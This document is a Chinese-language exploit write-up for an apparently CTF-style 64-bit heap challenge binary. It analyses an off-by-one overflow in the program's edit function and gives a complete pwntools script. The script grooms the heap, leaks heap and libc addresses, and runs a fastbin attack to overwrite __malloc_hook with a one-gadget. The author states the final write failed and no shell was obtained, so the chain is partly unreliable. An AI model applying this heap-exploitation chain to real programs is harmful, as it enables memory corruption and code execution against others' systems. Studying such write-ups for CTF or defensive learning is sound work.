# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析，程序运行环境如下：
- **二进制类型**：64位ELF，启用PIE（地址随机化）、Stack Canary（栈保护）、NX（不可执行堆栈）、Partial RELRO（部分重定位只读）
- **依赖库**：标准C库（libc），通过`ldd`确认依赖动态链接库
- **运行需求**：Linux环境，需要堆管理机制（ptmalloc2），程序通过菜单驱动提供堆操作功能
- **安全机制**：
  - PIE：需要泄漏地址绕过
  - Canary：栈溢出防护
  - NX：防止shellcode执行
  - Partial RELRO：GOT表可写，便于利用

## 漏洞成因
### 关键结构体分析
- **全局数组**：
  - `chunk[50]`：存储堆块指针数组，位于0x626ed0a02260
  - `size[50]`：存储堆块大小数组，位于0x626ed0a020c0
- **堆块元数据**：包含prev_size、size、fd、bk等字段，符合glibc堆管理结构

### 漏洞分析
- **漏洞类型**：Off-by-one堆溢出
- **漏洞位置**：`edit`函数中的`read(0, (void *)chunk[v1], (unsigned int)(v2 + 1))`
  - `v2 = size[v1]`，但读取`size[v1] + 1`字节
  - 导致写入超出分配大小1字节，可能覆盖相邻堆块元数据
- **漏洞触发**：
  - 通过精心构造的edit操作，溢出覆盖下一个堆块的size字段或指针
  - 结合UAF（Use-After-Free）和堆布局操纵，实现内存破坏

### 漏洞利用条件
- 可控制堆分配和释放顺序
- 可通过show函数泄漏内存内容
- 全局数组未正确验证索引，但程序有基本范围检查

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample25')
elf = ELF('./data/sample25')
libc = elf.libc

def create(ID,size):
    p.sendline(b'1')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(str(size).encode('utf-8'))

def show(ID):
    p.sendline(b'2')
    p.sendline(str(ID).encode('utf-8'))

def dele(ID):
    p.sendline(b'3')
    p.sendline(str(ID).encode('utf-8'))

def edit(ID,content):
    p.sendline(b'4')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(content)

# 步骤1: 初始堆布局，创建fastbin链表
create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)

# 步骤2: 触发off-by-one溢出，测试溢出能力
payload = b'a'*0x1f  # 填充31字节，触发溢出
edit(6,payload)

# 步骤3: 泄漏堆地址，计算堆基址
show(6)
p.recvuntil(b'to show?Content:')
p.recvline()
chunk_addr = p.recvline()[:-1]
chunk_addr = int.from_bytes(chunk_addr,'little')
chunk_addr = chunk_addr - 0x50  # 调整到堆基址

# 步骤4: 重构堆布局，准备攻击
create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)

# 步骤5: 伪造chunk元数据，设置堆扩展
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20  # 计算目标chunk地址
payload = b'a'*0x10 + p64(0x120) + p64(0x100)  # 伪造prev_size和size
edit(2,payload)

# 步骤6: 消耗fastbin，准备进一步操作
create(5,0x40)

# 步骤7: 设置伪造unsorted bin chunk
payload = b'a'*0x10 + p64(0) + p64(0x121) + p64(chunk1_addr) + p64(chunk1_addr)
edit(0,payload)

# 步骤8: 释放chunk到unsorted bin，创建泄漏点
dele(3)

# 步骤9: 重新分配，指向unsorted bin
create(1,0xf8)

# 步骤10: 泄漏libc地址
show(2)
p.recvuntil(b'to show?Content: ')
main_area = p.recvline()[:-1]
main_area = int.from_bytes(main_area,'little')

# 步骤11: 准备fastbin攻击链
create(10,0x68);dele(10)

# 步骤12: 计算伪造chunk地址，修改fastbin指针
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook']  # 计算libc基址
malloc_hook = libc_addr + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23  # 指向__malloc_hook附近伪造chunk
edit(2, p64(fake_chunk))  # 修改chunk2指针指向伪造地址

# 步骤13: 通过fastbin攻击获得目标内存控制权
create(11,0x68);create(13,0x68)  # chunk13分配到__malloc_hook附近

# 步骤14: 尝试覆盖hook函数（实际执行中写入不完整）
ogg = libc_addr + 0x4526a + 6  # one-gadget地址
realloc_hook = libc_addr + libc.sym["realloc"]
edit(13, b'a'*3 + p64(0) + p64(ogg) + p64(realloc_hook+16))  # 设置执行链

# 步骤15: 触发malloc执行hook（实际因覆盖失败未成功）
create(14,20)

p.interactive()
```

### 关键注释说明
- **堆布局操纵**：通过精心安排的分配和释放，控制fastbin和unsorted bin链表
- **地址泄漏**：利用unsorted bin的fd/bk指针泄漏libc，通过溢出泄漏堆地址
- **Fastbin攻击**：修改fastbin链表指向伪造chunk，实现任意地址写
- **Hook覆盖**：目标是覆盖__malloc_hook执行one-gadget，但实际利用中写入操作存在问题
- **利用限制**：由于off-by-one溢出精确性要求和堆布局复杂性，实际利用可能需要调整payload和堆操作顺序

此exp展示了完整的漏洞利用链构造，但在实际调试中由于内存写入不完整，最终未成功获得shell。需要进一步优化payload和堆操作序列。
